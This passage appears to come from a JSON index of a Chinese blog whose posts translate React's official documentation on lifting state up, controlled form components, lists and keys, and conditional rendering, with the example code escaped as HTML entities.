value=&#123;temperature&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;/fieldset&gt; ); &#125;&#125; 现在我们修改 Calculator 来渲染两个独立的温度输入： 12345678910class Calculator extends React.Component &#123; render() &#123; return ( &lt;div&gt; &lt;TemperatureInput scale=\"c\" /&gt; &lt;TemperatureInput scale=\"f\" /&gt; &lt;/div&gt; ); &#125;&#125; 我们现在有两个 (input) 输入框 了，但是当你输入其中一个温度时，另一个输入并没有更新。这是跟我们的需要不符的：我们希望它们保持同步。 另外，我们此时也不能从 Calculator 组件中展示 BoilingVerdict 的渲染结果。因为现在表示温度的状态数据只存在于 TemperatureInput 组件当中。 三、编写转换函数 首先，我们写两个可以将摄氏度和华氏度互相转换的函数： 1234567function toCelsius(fahrenheit) &#123; return (fahrenheit - 32) * 5 / 9;&#125;function toFahrenheit(celsius) &#123; return (celsius * 9 / 5) + 32;&#125; 接下来再编写一个函数，用来接收一个字符串 temperature 和一个 转化器函数 作为参数，并返回一个字符串。 这个函数用来在两个输入之间进行相互转换（对于无效的 temperature 值，它返回一个空字符串，输出结果保留3位小数）： 123456789function tryConvert(temperature, convert) &#123; const input = parseFloat(temperature); if (Number.isNaN(input)) &#123; return ''; &#125; const output = convert(input); const rounded = Math.round(output * 1000) / 1000; return rounded.toString();&#125; 例如， tryConvert(‘abc’, toCelsius) 将返回一个空字符串，而 tryConvert(‘10.22’, toFahrenheit) 返回 ‘50.396’ 。 四、状态提升 目前，两个 TemperatureInput 组件都将其值保持在本地状态中： 12345678910111213class TemperatureInput extends React.Component &#123; constructor(props) &#123; super(props); this.handleChange = this.handleChange.bind(this); this.state = &#123;temperature: ''&#125;; &#125; handleChange(e) &#123; this.setState(&#123;temperature: e.target.value&#125;); &#125; render() &#123; const temperature = this.state.temperature; 我们希望这两个输入是相互同步的。当我们更新摄氏温度时，华氏温度应反映转换后的温度，反之亦然。 在 React 中，共享 state 是通过将其移动到最接近的共同祖先组件来实现的。 这被称为“状态提升”。我们将从 TemperatureInput 中移除相关状态，并将其移动到 Calculator 中。 如果 Calculator 拥有共享状态，那么它将成为两个输入当前温度的“单一数据来源”。它可以指示他们具有彼此一致的值。由于两个 TemperatureInput 组件的 props 都来自同一个父级Calculator组件，两个输入将始终保持同步。 具体工作如下： 首先，我们在 TemperatureInput 组件中用 this.props.temperature 替换 this.state.temperature 。 现在，我们假定 this.props.temperature 已经存在，虽然将来需要从 Calculator 传递过来： 1234567render() &#123; // 之前是: const temperature = this.state.temperature; const temperature = this.props.temperature; ……&#125; 我们知道 props(属性) 是只读的。 当 temperature 是本地 state 时， TemperatureInput 可以调用 this.setState() 来更改它。 然而，现在 temperature 来自父级作为 prop(属性) ，TemperatureInput 就无法控制它。 在 React 中，这通常通过使组件“受控”的方式来解决。就像 &lt; input &gt; 能够接受 value 和 onChange 这两个prop属性值，自定义组件 TemperatureInput 也能接受来自 Calculator 父组件的 temperature 变量和 onTemperatureChange 方法作为props属性值。 现在，当 TemperatureInput 组件更新其温度时，它就会调用this.props.onTemperatureChange： 12345handleChange(e) &#123; // 之前是: this.setState(&#123;temperature: e.target.value&#125;); this.props.onTemperatureChange(e.target.value); …… 注意自定义组件中的 temperature 或 onTemperatureChange 属性名称没有特殊的含义。我们可以命名为任何其他名称，像命名他们为 value 和 onChange，是一个常见的惯例。 onTemperatureChange 和 temperature 两个props属性均由父级的 Calculator 组件提供。父组件可以通过修改自己的本地 state 来处理变更，从而通过新值重新渲染两个输入。 在修改 Calculator 之前，回顾一下对 TemperatureInput 组件的更改。我们将其自身的 state 从组件中移除，使用 this.props.temperature 替代 this.state.temperature 。当我们想要更改时， 不是调用 this.setState() ，而是调用 this.props.onTemperatureChange()， 这将由 Calculator 提供： 12345678910111213141516171819202122class TemperatureInput extends React.Component &#123; constructor(props) &#123; super(props); this.handleChange = this.handleChange.bind(this); &#125; handleChange(e) &#123; this.props.onTemperatureChange(e.target.value); &#125; render() &#123; const temperature = this.props.temperature; const scale = this.props.scale; return ( &lt;fieldset&gt; &lt;legend&gt;Enter temperature in &#123;scaleNames[scale]&#125;:&lt;/legend&gt; &lt;input value=&#123;temperature&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;/fieldset&gt; ); &#125;&#125; 接着看一下 Calculator 组件： 我们将当前输入的 temperature 和 scale 存储在本地 state 中。这是我们从输入 “提升” 的 state ，它将作为两个输入的 “单一数据来源” 。为了渲染两个输入，我们需要知道的所有数据的最小表示。 例如，如果我们在摄氏度输入框中输入 37 ，则 Calculator 组件的状态将是： 1234&#123; temperature: '37', scale: 'c'&#125; 如果我们稍后将华氏温度字段编辑为 212 ，则 Calculator 组件的状态将是： 1234&#123; temperature: '212', scale: 'f'&#125; 其实我们可以存储两个输入框的值，但事实证明是不必要的。存储最近更改的输入框的值，以及它所表示的度量衡就够了。然后，我们可以基于当前的 temperature(温度) 和 scale(度量衡) 来推断其他输入的值。 现在输入框能保持同步了，因为它们的值是从相同的 state 计算出来的： 1234567891011121314151617181920212223242526272829303132333435363738394041class Calculator extends React.Component &#123; constructor(props) &#123; super(props); this.handleCelsiusChange = this.handleCelsiusChange.bind(this); this.handleFahrenheitChange = this.handleFahrenheitChange.bind(this); this.state = &#123;temperature: '', scale: 'c'&#125;; &#125; handleCelsiusChange(temperature) &#123; this.setState(&#123;scale: 'c', temperature&#125;); &#125; handleFahrenheitChange(temperature) &#123; this.setState(&#123;scale: 'f', temperature&#125;); &#125; render() &#123; const scale = this.state.scale; const temperature = this.state.temperature; const celsius = scale === 'f' ? tryConvert(temperature, toCelsius) : temperature; const fahrenheit = scale === 'c' ? tryConvert(temperature, toFahrenheit) : temperature; return ( &lt;div&gt; &lt;TemperatureInput scale=\"c\" temperature=&#123;celsius&#125; onTemperatureChange=&#123;this.handleCelsiusChange&#125; /&gt; &lt;TemperatureInput scale=\"f\" temperature=&#123;fahrenheit&#125; onTemperatureChange=&#123;this.handleFahrenheitChange&#125; /&gt; &lt;BoilingVerdict celsius=&#123;parseFloat(celsius)&#125; /&gt; &lt;/div&gt; ); &#125;&#125; 现在，无论你编辑哪个输入框，Calculator 中的 this.state.temperature 和 this.state.scale 都会更新。其中之一的输入框得到用户原样输入的值，另一个输入框总是显示基于这个值计算出的结果。 回顾一下编辑输入时会发生什么： a、React 调用在 DOM &lt; input &gt; 上的 onChange 指定的函数。在我们的例子中，指的是 TemperatureInput 组件中的 handleChange 方法。 b、TemperatureInput 组件的 handleChange 函数会在值发生变化时调用 this.props.onTemperatureChange() 函数。 TemperatureInput 组件中的 props属性 ，包括 onTemperatureChange，由其父组件 Calculator 提供。 c、当最开始渲染时，Calculator 组件把内部的 handleCelsiusChange 方法指定给摄氏输入组件 TemperatureInput 的 onTemperatureChange 方法，并且把 handleFahrenheitChange 方法指定给华氏输入组件 TemperatureInput 的 onTemperatureChange 。两个 Calculator 内部的方法都会在相应输入框被编辑时被调用。 d、在这些方法内部， Calculator 组件会让 React 使用编辑输入的新值和当前输入框的温标来调用 this.setState() 方法来重渲染自身。 e、React 调用 Calculator 组件的 render 方法来识别 UI 外观应该是什么样子。基于当前温度和激活的度量衡来重新计算两个输入框的值。这里进行温度转换。 f、接着React会使用 Calculator 指定的新props来分别调用 TemperatureInput 组件，React 也会识别出子组件的UI界面。 g、React DOM 更新 DOM 以匹配期望的输入值。我们刚刚编辑的输入框接收当前值，另一个输入框更新为转换后的温度。 每个更新都会执行相同的步骤，以便输入保持同步。 五、经验总结 在 React 应用中，对于任何可变的数据都应该循序“单一数据源”原则。通常情况下，state 首先被添加到需要进行渲染的组件。然后，如果其它的组件也需要它，可以提升状态到它们最近的祖先组件。应该依赖从上到下的数据流向，而不是试图在不同的组件中同步状态。 提升状态相对于双向绑定方法需要写更多的“模板”代码，但有一个好处，它可以更方便的找到和隔离 bugs。因为任何 state 都 “存活” 在若干的组件中，而且可以分别对其独立修改，所以发生错误的可能大大减少。另外，你可以实现任何定制的逻辑来拒绝或者转换用户输入。 如果某个东西可以从 props(属性) 或者 state(状态) 得到，那么它很有可能不应该在state中出现。例如，我们只保存最后编辑的 temperature 和它的 scale，而不是保存 celsiusValue 和 fahrenheitValue 。另一个输入框的值总是在 render() 方法中计算得来的。这使我们对其进行清除和四舍五入到其他字段同时不会丢失用户输入的精度。 当你看到 UI 中的错误，你可以使用 React 开发者工具 来检查 props ，并向上遍历树，直到找到负责更新状态的组件。这使你可以跟踪到 bug 的源头： Monitoring State in React DevTools 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之09-表单","slug":"React-gw-09","date":"2018-07-07T17:01:39.000Z","updated":"2018-07-07T17:04:18.956Z","comments":true,"path":"2018/07/08/React-gw-09/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-09/","excerpt":"","text":"一、表单 HTML表单元素与React中的其他DOM元素有所不同，因为表单元素自然地保留了一些内部状态。例如，下面这个表单接受一个单独的 name： 1234567&lt;form&gt; &lt;label&gt; Name: &lt;input type=\"text\" name=\"name\" /&gt; &lt;/label&gt; &lt;input type=\"submit\" value=\"Submit\" /&gt;&lt;/form&gt; 当用户提交表单时，HTML的默认行为会使这个表单跳转到一个新页面。在React中亦是如此。但多数情况下，我们会构造一个处理提交表单并可访问用户输入表单数据的函数。实现这一点的标准方法是使用一种称为“受控组件”的技术。 二、受控组件 HTML 中，表单元素如 &lt; input &gt;，&lt; textarea &gt; 和 &lt; select &gt; 等通常会保持自己的状态，并根据用户输入进行更新。而在 React 中，可变的状态一般保存在组件的 state 属性中，并且只能通过 setState() 更新。 我们可以通过使 React 的 state 成为 “单一数据源原则” 来实现状态保持，同时渲染表单的 React 组件也可以控制用户输入之后的行为。这种形式，其值由 React 控制输入的表单元素称为“受控组件”。 例如，如果我们想使上一个例子在提交时记录名称，我们可以将表单写为受控组件： 123456789101112131415161718192021222324252627282930class NameForm extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;value: ''&#125;; this.handleChange = this.handleChange.bind(this); this.handleSubmit = this.handleSubmit.bind(this); &#125; handleChange(event) &#123; this.setState(&#123;value: event.target.value&#125;); &#125; handleSubmit(event) &#123; alert('A name was submitted: ' + this.state.value); event.preventDefault(); &#125; render() &#123; return ( &lt;form onSubmit=&#123;this.handleSubmit&#125;&gt; &lt;label&gt; Name: &lt;input type=\"text\" value=&#123;this.state.value&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;/label&gt; &lt;input type=\"submit\" value=\"Submit\" /&gt; &lt;/form&gt; ); &#125;&#125; 由于 value 属性是在我们的表单元素上设置的，因此显示的值将始终为 React 数据源上 this.state.value 的值。由于每次按键都会触发 handleChange 来更新当前 React 的 state ，所展示的值也会随着不同用户的输入而更新。 对于受控组件来说，每个状态的改变都有一个与之相关的处理函数。这样就可以直接修改或验证用户输入。 比如，如果我们希望强制 name 的输入都是大写字母，可以这样来写 handleChange 方法： 123handleChange(event) &#123; this.setState(&#123;value: event.target.value.toUpperCase()&#125;);&#125; 三、textare 标签 在 HTML 中，&lt; textarea &gt; 元素通过它的子节点定义了它的文本值： 123&lt;textarea&gt; Hello there, this is some text in a text area&lt;/textarea&gt; 在 React 中，&lt; textarea &gt; 的赋值使用 value 属性替代。这样一来，表单中 &lt; textarea &gt; 的书写方式接近于单行文本输入框 ： 1234567891011121314151617181920212223242526272829303132class EssayForm extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; value: 'Please write an essay about your favorite DOM element.' &#125;; this.handleChange = this.handleChange.bind(this); this.handleSubmit = this.handleSubmit.bind(this); &#125; handleChange(event) &#123; this.setState(&#123;value: event.target.value&#125;); &#125; handleSubmit(event) &#123; alert('An essay was submitted: ' + this.state.value); event.preventDefault(); &#125; render() &#123; return ( &lt;form onSubmit=&#123;this.handleSubmit&#125;&gt; &lt;label&gt; Name: &lt;textarea value=&#123;this.state.value&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;/label&gt; &lt;input type=\"submit\" value=\"Submit\" /&gt; &lt;/form&gt; ); &#125;&#125; 注意，this.state.value 在构造函数中初始化，所以这些文本一开始就出现在文本域中。 四、select 标签 在 HTML 中，&lt; select &gt; 会创建一个下拉列表。例如这段 HTML 创建一个下拉的列表： 123456&lt;select&gt; &lt;option value=\"grapefruit\"&gt;Grapefruit&lt;/option&gt; &lt;option value=\"lime\"&gt;Lime&lt;/option&gt; &lt;option value=\"coconut\" selected&gt;Coconut&lt;/option&gt; &lt;option value=\"mango\"&gt;Mango&lt;/option&gt;&lt;/select&gt; 注意，Coconut 选项是初始化时由于 selected 选中的。React 中，并不使用这个 selected 属性，而是在根 select 标签中使用了一个 value 属性。 这使得受控组件使用更方便，因为你只需要更新一处即可。例如： 1234567891011121314151617181920212223242526272829303132333435class FlavorForm extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;value: 'coconut'&#125;; this.handleChange = this.handleChange.bind(this); this.handleSubmit = this.handleSubmit.bind(this); &#125; handleChange(event) &#123; this.setState(&#123;value: event.target.value&#125;); &#125; handleSubmit(event) &#123; alert('Your favorite flavor is: ' + this.state.value); event.preventDefault(); &#125; render() &#123; return ( &lt;form onSubmit=&#123;this.handleSubmit&#125;&gt; &lt;label&gt; Pick your favorite La Croix flavor: &lt;select value=&#123;this.state.value&#125; onChange=&#123;this.handleChange&#125;&gt; &lt;option value=\"grapefruit\"&gt;Grapefruit&lt;/option&gt; &lt;option value=\"lime\"&gt;Lime&lt;/option&gt; &lt;option value=\"coconut\"&gt;Coconut&lt;/option&gt; &lt;option value=\"mango\"&gt;Mango&lt;/option&gt; &lt;/select&gt; &lt;/label&gt; &lt;input type=\"submit\" value=\"Submit\" /&gt; &lt;/form&gt; ); &#125;&#125; 总的来说，&lt; input type=”text” &gt;， &lt; textarea &gt; 和 &lt; select &gt; 都以类似的方式工作，它们都通过传入一个 value 属性来实现对组件的控制。 注意可以将一个数组传递给 value 属性，允许你在 select 标签中选择多个选项： 1&lt;select multiple=&#123;true&#125; value=&#123;['B', 'C']&#125;&gt; 五、file input 标签 在HTML中，&lt; input type=”file” &gt; 允许用户从他们的存储设备中选择一个或多个文件以提交表单的方式上传到服务器上，或者通过 JavaScript 使用 File API 对文件进行操作： 1&lt;input type=\"file\" /&gt; 在 React 中，一个 &lt; input type=”file” /&gt; 和一个普通的 &lt; input /&gt; 类似，但有一个重要的区别：它是只读的(read-only)，不能以编程方式设置值，相反，你应该使用 File API 与文件进行交互。 以下示例显示了如何使用一个 ref 来访问提交处理程序中的文件： 123456789101112131415161718192021222324252627282930313233343536373839404142class FileInput extends React.Component &#123; constructor(props) &#123; super(props); this.handleSubmit = this.handleSubmit.bind( this ); &#125; handleSubmit(event) &#123; event.preventDefault(); alert( `Selected file - $&#123; this.fileInput.files[0].name &#125;` ); &#125; render() &#123; return ( &lt;form onSubmit=&#123;this.handleSubmit&#125;&gt; &lt;label&gt; Upload file: &lt;input type=\"file\" ref=&#123;input =&gt; &#123; this.fileInput = input; &#125;&#125; /&gt; &lt;/label&gt; &lt;br /&gt; &lt;button type=\"submit\"&gt; Submit &lt;/button&gt; &lt;/form&gt; ); &#125;&#125;ReactDOM.render( &lt;FileInput /&gt;, document.getElementById('root')); 六、处理多个输入元素 当需要处理多个受控的 input 元素时，可以为每个元素添加一个 name 属性，并让处理函数根据 event.target.name 的值来选择要做什么： 123456789101112131415161718192021222324252627282930313233343536373839404142434445class Reservation extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; isGoing: true, numberOfGuests: 2 &#125;; this.handleInputChange = this.handleInputChange.bind(this); &#125; handleInputChange(event) &#123; const target = event.target; const value = target.type === 'checkbox' ? target.checked : target.value; const name = target.name; this.setState(&#123; [name]: value &#125;); &#125; render() &#123; return ( &lt;form&gt; &lt;label&gt; Is going: &lt;input name=\"isGoing\" type=\"checkbox\" checked=&#123;this.state.isGoing&#125; onChange=&#123;this.handleInputChange&#125; /&gt; &lt;/label&gt; &lt;br /&gt; &lt;label&gt; Number of guests: &lt;input name=\"numberOfGuests\" type=\"number\" value=&#123;this.state.numberOfGuests&#125; onChange=&#123;this.handleInputChange&#125; /&gt; &lt;/label&gt; &lt;/form&gt; ); &#125;&#125; 注意我们如何使用 ES6 当中的计算属性名语法来更新与给定输入名称相对应的状态键： 123this.setState(&#123; [name]: value&#125;); 这段代码等价于 ES5 代码: 123var partialState = &#123;&#125;;partialState[name] = value;this.setState(partialState); 此外，由于 setState() 自动将部分状态合并到当前状态，所以我们只需要调用更改的部分即可。 七、受控 Input 组件的 null 值 在受控组件上指定 prop 可防止用户更改输入。 如果你已经指定了一个 value ，但是输入仍然是可编辑的，你可能会意外地把 value 设置为 undefined 或 null 。 以下代码演示了这一点。 （输入首先被锁定，但在短暂的延迟后可以编辑。） 12345ReactDOM.render(&lt;input value=\"hi\" /&gt;, mountNode);setTimeout(function() &#123; ReactDOM.render(&lt;input value=&#123;null&#125; /&gt;, mountNode);&#125;, 1000); 八、受控组件的替代方案 有时使用受控组件可能很繁琐，因为你需要为每一个可更改的数据提供事件处理器，并通过 React 组件管理所有输入状态。 当你将已经存在的代码转换为 React 时，或将 React 应用程序与非 React 库集成时，这可能变得特别烦人。在这些情况下，您可能需要使用不受控的组件，用于实现输入表单的替代技术。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之08-列表和键","slug":"React-gw-08","date":"2018-07-07T17:01:34.000Z","updated":"2018-07-07T17:10:39.072Z","comments":true,"path":"2018/07/08/React-gw-08/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-08/","excerpt":"","text":"一、列表1、转换列表： 我们回顾一下在 JavaScript 中如何转换列表。 如下代码，我们使用map()函数让数组numbers中的每一项翻倍,然后得到了一个新的数列doubled： 123const numbers = [1, 2, 3, 4, 5];const doubled = numbers.map((number) =&gt; number * 2);console.log(doubled); 在 React 中，转换数组为 元素列表 的方式，和上述方法基本相同。 2、多组件渲染： 可以通过使用 {} 在JSX内构建一个元素集合。 下面我们用 JavaScript 的 map() 函数将 numbers 数组循环处理。对于每一项，我们返回一个 &lt; li &gt; 标签。最终我们将结果元素数组分配给 listItems： 1234const numbers = [1, 2, 3, 4, 5];const listItems = numbers.map((number) =&gt; &lt;li&gt;&#123;number&#125;&lt;/li&gt;); 把整个 listItems 数组插入到一个 &lt; ul &gt; 元素中，并渲染到 DOM： 1234ReactDOM.render( &lt;ul&gt;&#123;listItems&#125;&lt;/ul&gt;, document.getElementById('root')); 3、基本列表组件： 通常情况下，我们会在一个组件中渲染列表。可以把前面的例子重构成一个组件，它接受一个 numbers 数组作为参数，输出一个无序列表： 123456789101112131415function NumberList(props) &#123; const numbers = props.numbers; const listItems = numbers.map((number) =&gt; &lt;li&gt;&#123;number&#125;&lt;/li&gt; ); return ( &lt;ul&gt;&#123;listItems&#125;&lt;/ul&gt; );&#125;const numbers = [1, 2, 3, 4, 5];ReactDOM.render( &lt;NumberList numbers=&#123;numbers&#125; /&gt;, document.getElementById('root')); 当运行上述代码的时候，会收到一个警告：a key should be provided for list items（应该为列表元素提供一个键，CodeOpen 中没有报警告，是因为其示例中使用的是 min 版本的 React，换成非 min 版本的就可以看到）。当创建元素列表时，“key” 是一个你需要包含的特殊字符串属性。我们将在下面讨论它的重要性。 我们在 numbers.map() 中赋值一个 key 给我们的列表元素，解决丢失 key 的问题: 1234567891011121314151617function NumberList(props) &#123; const numbers = props.numbers; const listItems = numbers.map((number) =&gt; &lt;li key=&#123;number.toString()&#125;&gt; &#123;number&#125; &lt;/li&gt; ); return ( &lt;ul&gt;&#123;listItems&#125;&lt;/ul&gt; );&#125;const numbers = [1, 2, 3, 4, 5];ReactDOM.render( &lt;NumberList numbers=&#123;numbers&#125; /&gt;, document.getElementById('root')); 二、键1、定义： 键(Keys) 帮助 React 标识哪个项被修改、添加或者移除了。数组中的每一个元素都应该有一个唯一不变的键来标识： 123456const numbers = [1, 2, 3, 4, 5];const listItems = numbers.map((number) =&gt; &lt;li key=&#123;number.toString()&#125;&gt; &#123;number&#125; &lt;/li&gt;); 一个元素的key最好是这个元素在列表中拥有的一个独一无二的字符串。通常，我们使用来自数据的id作为元素的key: 12345const todoItems = todos.map((todo) =&gt; &lt;li key=&#123;todo.id&#125;&gt; &#123;todo.text&#125; &lt;/li&gt;); 当元素没有确定的id时，你可以使用他的序列号索引index作为key： 123456const todoItems = todos.map((todo, index) =&gt; // Only do this if items have no stable IDs &lt;li key=&#123;index&#125;&gt; &#123;todo.text&#125; &lt;/li&gt;); 如果列表项可能被重新排序，我们不建议使用索引作为 keys，因为这会导致渲染变得很慢。 2、用 keys 提取组件： 元素的 key 只有在它和它的兄弟节点对比时才有意义。 例如，如果你提取一个 ListItem 组件，应该把 key 保存在数组中的这个 &lt; ListItem /&gt; 元素上，而不是放在 ListItem 组件中的&lt; li &gt;元素上。 例子：错误的 key 用法： 12345678910111213141516171819202122232425262728function ListItem(props) &#123; const value = props.value; return ( // 错误！不需要在这里指定 key： &lt;li key=&#123;value.toString()&#125;&gt; &#123;value&#125; &lt;/li&gt; );&#125;function NumberList(props) &#123; const numbers = props.numbers; const listItems = numbers.map((number) =&gt; // 错误！key 应该在这里指定： &lt;ListItem value=&#123;number&#125; /&gt; ); return ( &lt;ul&gt; &#123;listItems&#125; &lt;/ul&gt; );&#125;const numbers = [1, 2, 3, 4, 5];ReactDOM.render( &lt;NumberList numbers=&#123;numbers&#125; /&gt;, document.getElementById('root')); 例子：key 应该在这里指定： 12345678910111213141516171819202122232425function ListItem(props) &#123; // 正确！这里不需要指定 key ： return &lt;li&gt;&#123;props.value&#125;&lt;/li&gt;;&#125;function NumberList(props) &#123; const numbers = props.numbers; const listItems = numbers.map((number) =&gt; // 正确！key 应该在这里被指定 &lt;ListItem key=&#123;number.toString()&#125; value=&#123;number&#125; /&gt; ); return ( &lt;ul&gt; &#123;listItems&#125; &lt;/ul&gt; );&#125;const numbers = [1, 2, 3, 4, 5];ReactDOM.render( &lt;NumberList numbers=&#123;numbers&#125; /&gt;, document.getElementById('root')); 一个好的经验准则是元素中调用 map() 需要 keys 。 3、keys 在同辈元素中必须是唯一的： 在数组中使用的 keys 必须在它们的同辈之间唯一。然而它们并不需要全局唯一。我们可以在操作两个不同数组的时候使用相同的 keys ： 123456789101112131415161718192021222324252627282930313233function Blog(props) &#123; const sidebar = ( &lt;ul&gt; &#123;props.posts.map((post) =&gt; &lt;li key=&#123;post.id&#125;&gt; &#123;post.title&#125; &lt;/li&gt; )&#125; &lt;/ul&gt; ); const content = props.posts.map((post) =&gt; &lt;div key=&#123;post.id&#125;&gt; &lt;h3&gt;&#123;post.title&#125;&lt;/h3&gt; &lt;p&gt;&#123;post.content&#125;&lt;/p&gt; &lt;/div&gt; ); return ( &lt;div&gt; &#123;sidebar&#125; &lt;hr /&gt; &#123;content&#125; &lt;/div&gt; );&#125;const posts = [ &#123;id: 1, title: 'Hello World', content: 'Welcome to learning React!'&#125;, &#123;id: 2, title: 'Installation', content: 'You can install React from npm.'&#125;];ReactDOM.render( &lt;Blog posts=&#123;posts&#125; /&gt;, document.getElementById('root')); keys 是 React 的一个内部映射，但其不会传递给组件的内部。如果你需要在组件中使用相同的值，可以明确使用一个不同名字的 prop 传入: 123456const content = posts.map((post) =&gt; &lt;Post key=&#123;post.id&#125; id=&#123;post.id&#125; title=&#123;post.title&#125; /&gt;); 上面的例子中， Post 组件可以读取 props.id，但是不能读取 props.key 。 4、在 JSX 中嵌入 map()： 上面的例子中，我们单独声明了一个 listItems 变量，并在 JSX 中引用了该变量： 12345678910111213function NumberList(props) &#123; const numbers = props.numbers; const listItems = numbers.map((number) =&gt; &lt;ListItem key=&#123;number.toString()&#125; value=&#123;number&#125; /&gt; ); return ( &lt;ul&gt; &#123;listItems&#125; &lt;/ul&gt; );&#125; JSX允许在大括号中嵌入任何表达式，因此可以 内联 map() 结果： 123456789101112function NumberList(props) &#123; const numbers = props.numbers; return ( &lt;ul&gt; &#123;numbers.map((number) =&gt; &lt;ListItem key=&#123;number.toString()&#125; value=&#123;number&#125; /&gt; )&#125; &lt;/ul&gt; );&#125; 有时这可以产生清晰的代码，但是这个风格也可能被滥用。就像在 JavaScript 中，是否有必要提取一个变量以提高程序的可读性，这取决于你。但是记住，如果 map() 体中有太多嵌套，可能是提取组件的好时机。 标注： 参考资料1：https://reactjs.org/ 参考资料2：https://doc.react-china.org/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-react","slug":"前端-react","permalink":"http://liuxuewen-site.github.io/tags/前端-react/"}]},{"title":"React官网之07-条件渲染","slug":"React-gw-07","date":"2018-07-07T17:01:29.000Z","updated":"2018-07-07T17:03:10.928Z","comments":true,"path":"2018/07/08/React-gw-07/","link":"","permalink":"http://liuxuewen-site.github.io/2018/07/08/React-gw-07/","excerpt":"","text":"一、概述 React 中的条件渲染和 JavaScript 中的条件语句一样。使用 JavaScript 操作符如 if 或者条件操作符来创建渲染当前状态的元素，然后让 React 根据它们来更新 UI 。 看以下两个组件： 1234567function UserGreeting(props) &#123; return &lt;h1&gt;Welcome back!&lt;/h1&gt;;&#125;function GuestGreeting(props) &#123; return &lt;h1&gt;Please sign up.&lt;/h1&gt;;&#125; 我们将创建一个 Greeting 组件, 根据用户是否登录来显示上述两个组件之一： 12345678910111213function Greeting(props) &#123; const isLoggedIn = props.isLoggedIn; if (isLoggedIn) &#123; return &lt;UserGreeting /&gt;; &#125; return &lt;GuestGreeting /&gt;;&#125;ReactDOM.render( // 修改为 isLoggedIn=&#123;true&#125; 试试: &lt;Greeting isLoggedIn=&#123;false&#125; /&gt;, document.getElementById('root')); 这个例子就是根据 isLoggedIn prop 渲染了不同的问候语 。 二、元素变量 可以用变量来存储元素，这可以有条件地渲染组件的一部分，而其余部分不会更改。 思考以下两个新组件，分别用于显示注销和登录按钮： 123456789101112131415function LoginButton(props) &#123; return ( &lt;button onClick=&#123;props.onClick&#125;&gt; Login &lt;/button&gt; );&#125;function LogoutButton(props) &#123; return ( &lt;button onClick=&#123;props.onClick&#125;&gt; Logout &lt;/button&gt; );&#125; 接下来，我们创建一个有状态组件，叫做 LoginControl 。它会根据当前的状态来渲染 &lt; LoginButton /&gt; 或者 &lt; LogoutButton /&gt; 。同时渲染前面提到的 &lt; Greeting /&gt; 组件: 123456789101112131415161718192021222324252627282930313233343536373839class LoginControl extends React.Component &#123; constructor(props) &#123; super(props); this.handleLoginClick = this.handleLoginClick.bind(this); this.handleLogoutClick = this.handleLogoutClick.bind(this); this.state = &#123;isLoggedIn: false&#125;; &#125; handleLoginClick() &#123; this.setState(&#123;isLoggedIn: true&#125;); &#125; handleLogoutClick() &#123; this.setState(&#123;isLoggedIn: false&#125;); &#125; render() &#123; const isLoggedIn = this.state.isLoggedIn; let button = null; if (isLoggedIn) &#123; button = &lt;LogoutButton onClick=&#123;this.handleLogoutClick&#125; /&gt;; &#125; else &#123; button = &lt;LoginButton onClick=&#123;this.handleLoginClick&#125; /&gt;; &#125; return ( &lt;div&gt; &lt;Greeting isLoggedIn=&#123;isLoggedIn&#125; /&gt; &#123;button&#125; &lt;/div&gt; ); &#125;&#125;ReactDOM.render( &lt;LoginControl /&gt;, document.getElementById('root')); 虽然声明一个变量并使用一个 if 语句是一个有条件地渲染组件的好方法，但有时你可能想要使用一个更简短的语法。在 JSX 中有几种内联条件的方法，如下所述： a、使与运算符 &amp;&amp;： 可以在JSX中嵌入逻辑 &amp;&amp; 运算符，它有助于有条件地包含一个元素： 12345678910111213141516171819function Mailbox(props) &#123; const unreadMessages = props.unreadMessages; return ( &lt;div&gt; &lt;h1&gt;Hello!&lt;/h1&gt; &#123;unreadMessages.length &gt; 0 &amp;&amp; &lt;h2&gt; You have &#123;unreadMessages.length&#125; unread messages. &lt;/h2&gt; &#125; &lt;/div&gt; );&#125;const messages = ['React', 'Re: React', 'Re:Re: React'];ReactDOM.render( &lt;Mailbox unreadMessages=&#123;messages&#125; /&gt;, document.getElementById('root')); 它可以正常运行，因为在 JavaScript 中， true &amp;&amp; expression 会评估为 expression ，而 false &amp;&amp; expression 执行为 false 。因此，如果条件为 true ，则 &amp;&amp; 后面的元素将显示在输出中。 如果是 false，React 将会忽略并跳过它。 b、三目运算符： 另一种方法是使用 JavaScript 的条件操作符 condition ? true : false，我们用它来进行条件渲染一个小的文本块 ： 12345678render() &#123; const isLoggedIn = this.state.isLoggedIn; return ( &lt;div&gt; The user is &lt;b&gt;&#123;isLoggedIn ? 'currently' : 'not'&#125;&lt;/b&gt; logged in. &lt;/div&gt; );&#125; 它也可以用于更大的表达式，虽然不太明显发生了什么： 123456789101112render() &#123; const isLoggedIn = this.state.isLoggedIn; return ( &lt;div&gt; &#123;isLoggedIn ? ( &lt;LogoutButton onClick=&#123;this.handleLogoutClick&#125; /&gt; ) : ( &lt;LoginButton onClick=&#123;this.handleLoginClick&#125; /&gt; )&#125; &lt;/div&gt; );&#125; 三、防止组件渲染 在极少数情况下，可能希望组件隐藏自身，即使它被其他组件渲染。让 render 方法返回 null 而不是它的渲染结果即可实现。 下面的例子中，&lt; WarningBanner /&gt; 根据属性 warn 的值渲染。如果 prop 值为 false ，则该组件不渲染： 1234567891011121314151617181920212223242526272829303132333435363738394041function WarningBanner(props) &#123; if (!props.warn) &#123; return 